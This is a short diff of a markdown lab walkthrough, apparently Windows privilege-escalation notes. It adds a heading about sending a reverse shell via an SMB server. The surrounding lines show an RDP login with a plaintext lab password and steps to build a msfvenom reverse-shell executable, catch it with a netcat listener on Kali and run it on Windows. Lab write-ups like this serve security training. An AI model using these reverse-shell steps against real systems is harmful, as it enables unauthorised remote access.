@@ -6,6 +6,8 @@
 xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.34.38
 ```
 
+### Making SMB Server to send Rev-shell
+
 Generate a reverse shell executable \(reverse.exe\) using msfvenom.
 
 ```text
@@ -29,4 +31,6 @@ Test the reverse shell by setting up a netcat listener on Kali:
 Then run the reverse.exe executable on Windows and catch the shell:
 
 `C:\PrivEsc\reverse.exe`
+
+
 
